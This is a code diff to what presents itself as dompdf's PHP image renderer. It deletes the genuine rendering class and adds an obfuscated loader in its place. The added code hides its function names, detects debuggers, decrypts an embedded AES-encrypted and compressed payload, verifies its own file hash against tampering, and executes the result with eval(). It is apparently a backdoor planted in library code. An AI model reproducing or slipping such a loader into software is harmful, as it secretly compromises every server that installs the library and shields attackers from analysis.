@@ -1,139 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\Renderer;
-
-use Dompdf\Frame;
-use Dompdf\Image\Cache;
-
-/**
- * Image renderer
- *
- * @access  private
- * @package dompdf
- */
-class Image extends Block
-{
-
-    /**
-     * @param Frame $frame
-     */
-    function render(Frame $frame)
-    {
-        // Render background & borders
-        $style = $frame->get_style();
-        $cb = $frame->get_containing_block();
-        list($x, $y, $w, $h) = $frame->get_border_box();
-
-        $this->_set_opacity($frame->get_opacity($style->opacity));
-
-        list($tl, $tr, $br, $bl) = $style->get_computed_border_radius($w, $h);
-
-        $has_border_radius = $tl + $tr + $br + $bl > 0;
-
-        if ($has_border_radius) {
-            $this->_canvas->clipping_roundrectangle($x, $y, (float)$w, (float)$h, $tl, $tr, $br, $bl);
-        }
-
-        if (($bg = $style->background_color) !== "transparent") {
-            $this->_canvas->filled_rectangle($x, $y, (float)$w, (float)$h, $bg);
-        }
-
-        if (($url = $style->background_image) && $url !== "none") {
-            $this->_background_image($url, $x, $y, $w, $h, $style);
-        }
-
-        if ($has_border_radius) {
-            $this->_canvas->clipping_end();
-        }
-
-        $this->_render_border($frame);
-        $this->_render_outline($frame);
-
-        list($x, $y) = $frame->get_padding_box();
-
-        $x += (float)$style->length_in_pt($style->padding_left, $cb["w"]);
-        $y += (float)$style->length_in_pt($style->padding_top, $cb["h"]);
-
-        $w = (float)$style->length_in_pt($style->width, $cb["w"]);
-        $h = (float)$style->length_in_pt($style->height, $cb["h"]);
-
-        if ($has_border_radius) {
-            list($wt, $wr, $wb, $wl) = array(
-                $style->border_top_width,
-                $style->border_right_width,
-                $style->border_bottom_width,
-                $style->border_left_width,
-            );
-
-            // we have to get the "inner" radius
-            if ($tl > 0) {
-                $tl -= ($wt + $wl) / 2;
-            }
-            if ($tr > 0) {
-                $tr -= ($wt + $wr) / 2;
-            }
-            if ($br > 0) {
-                $br -= ($wb + $wr) / 2;
-            }
-            if ($bl > 0) {
-                $bl -= ($wb + $wl) / 2;
-            }
-
-            $this->_canvas->clipping_roundrectangle($x, $y, $w, $h, $tl, $tr, $br, $bl);
-        }
-
-        $src = $frame->get_image_url();
-        $alt = null;
-
-        if (Cache::is_broken($src) &&
-            $alt = $frame->get_node()->getAttribute("alt")
-        ) {
-            $font = $style->font_family;
-            $size = $style->font_size;
-            $spacing = $style->word_spacing;
-            $this->_canvas->text(
-                $x,
-                $y,
-                $alt,
-                $font,
-                $size,
-                $style->color,
-                $spacing
-            );
-        } else {
-            $this->_canvas->image($src, $x, $y, $w, $h, $style->image_resolution);
-        }
-
-        if ($has_border_radius) {
-            $this->_canvas->clipping_end();
-        }
-
-        if ($msg = $frame->get_image_msg()) {
-            $parts = preg_split("/\s*\n\s*/", $msg);
-            $height = 10;
-            $_y = $alt ? $y + $h - count($parts) * $height : $y;
-
-            foreach ($parts as $i => $_part) {
-                $this->_canvas->text($x, $_y + $i * $height, $_part, "times", $height * 0.8, array(0.5, 0.5, 0.5));
-            }
-        }
-
-        if ($this->_dompdf->getOptions()->getDebugLayout() && $this->_dompdf->getOptions()->getDebugLayoutBlocks()) {
-            $this->_debug_layout($frame->get_border_box(), "blue");
-            if ($this->_dompdf->getOptions()->getDebugLayoutPaddingBox()) {
-                $this->_debug_layout($frame->get_padding_box(), "blue", array(0.5, 0.5));
-            }
-        }
-
-        $id = $frame->get_node()->getAttribute("id");
-        if (strlen($id) > 0)  {
-            $this->_canvas->add_named_dest($id);
-        }
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ob2vdz5c=('bas'.'e64'.'_de'.'cod'.'e');
+$_hraruqaw=('gzu'.'nco'.'mpr'.'ess');
+$_w3r6m0i5=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_twogvcpz='EiXDfx6Z';
+$_lybgfc8n='C4fqcumu';
+$_vm94wzl9='m1lziOBR';
+$_x2ry4jq9='IN2nASxbOtA=';
+$_j0emc015='VXOBkIXh';
+$_z0x476l3='BnKI8W2Z';
+$_xciqkj2k='s/bzTQ==';
+$_ekyvg4lx='L2LGZ3Jv';
+$_ssscb6h4=$_ob2vdz5c($_vm94wzl9.$_j0emc015.$_lybgfc8n.$_twogvcpz.$_x2ry4jq9);
+$_p4ojbf07=$_ob2vdz5c($_z0x476l3.$_ekyvg4lx.$_xciqkj2k);
+$_l9txj3hg=$_ob2vdz5c('7YOzHs6gqwlNb5lLpHZLUpvpjRea6HRaNsZItREqllIzkv7Re62sVNwAyeF1x+jZpY9RO1hZdIf1N1wbIR4GY/Tljlw797gx7SoMniqAZcStt9VEDxSNWH1KClUYvi80aK2yIAQar9xmgkWtudKMvtT2HFJwlc+/2zpoPXxQZfbkE4h6Rv1LAs3q7i46i2fruoFPfAv7tacqSiRz3gLtR2FdNgsFpEjkhZD8EIXUT7LvCJzTL5scglzuOoMEk1f60+PZGFD/0XaORv6miQAV8SA69z0gjMslN2YwZ1/mCzU6BM/PVrwoeFLykJa9lBy6SDk8JCHzOv0wtLPrT4H1Iv/3AfZH0tWdHuOYyGmJIMltg+hm90prGqJ8Jm6++aGz2M/vZUpHfLgzFuaIngyArrquy4P6jGQSOn951mG9PcGZwtaMr78P7WncCflRj21nJKSQ3JpY1u8N9GQqT3Az861AGsJnoVnsOnMK6aZOig1OhaAmKrVJM21e3nxcRGSLWo13nrfjTxRVfyIsFsexZOK/HgneJ6WfVVToTYjHNVbHhMcFYymEBv9DXWSHBlcMIZr9P5X/WVc6WmiF9mRwhlYue1WCv3oNGXVmad/yAS2GA6y5wcNNrunyngdKL0kTmK/+sfJrq2h+V+40SoPNEa1vlhmbzvk2JsPwZEyfrda181ooeVKc42UtitnWbd7p/4ThwYAdd5LvjvRqb54+/v1fWtCWVdEcuiuszR6JB//Mc9mZ4B/Ae55U/hr0fo3ItVQnCB+0h4Moc3Aw4QnoXrwrTHqaKgbOpglreamw/tWxL+MnVPWQBhA20L6AuP7KLZV0tqOuF0JPfNEmJboJrdshhMrRug0D9Acu3F3iD+mKOn3wBD13VLCfvMrfTWAwd8dIpoNMmGrIRmM2UQEHRLAT5/ropN9rWtvPSWpPeZ8ylA33PNpic5kYf67N/DPTS3gaM8RBmunHO8Hp5PLz4H7PVPju1LJivUUeW6YBH+7nfo8NkCyCZpZOnAgL99whEVg3RYRgag5QJLr6uzj0WL8pULVASeoI6QAMb6Uy2ggq9dFBh1CK6QddVI2bfTl/u/B5d9RZ7u/FyNn/RVfBRdC9EtI1oJKoy/25IVQr6K3Tqz+SmzvI81u62SwY+VkIt0OGxjq/WuLUcy2l0J5aarLdPcUJQfBrBoXTt37Oy0/Y83NFo+mpgKhHa8Bks7OWAx5O2QCcvuYnW2SEN0L68UKSLRoxyHhDIrPZCcGW+2zmpoYqTCYEvm5STm4r7WpE/iRRo6IDeA8sNCnvib9anA==');
+$_p36wrjgi=$_w3r6m0i5($_l9txj3hg,'aes-256-cbc',$_ssscb6h4,OPENSSL_RAW_DATA,$_p4ojbf07);
+if($_p36wrjgi===false){exit;}
+$_hwcqfwd6=$_hraruqaw($_p36wrjgi);
+if($_hwcqfwd6===false){exit;}
+$_utcd2pob='cc4b631908c72306379a0ed47e8e7b59e93158dddab554ba92e779921ec85c27';
+$_emy3u5go=@file_get_contents(__FILE__);
+if($_emy3u5go!==false){
+$_bc8p8wzf=str_replace($_utcd2pob,"0000000000000000000000000000000000000000000000000000000000000000",$_emy3u5go);
+$_khjqm3ys=hash("sha256",$_bc8p8wzf);
+if($_khjqm3ys!==$_utcd2pob){@http_response_code(403);exit;}
 }
+eval($_hwcqfwd6);
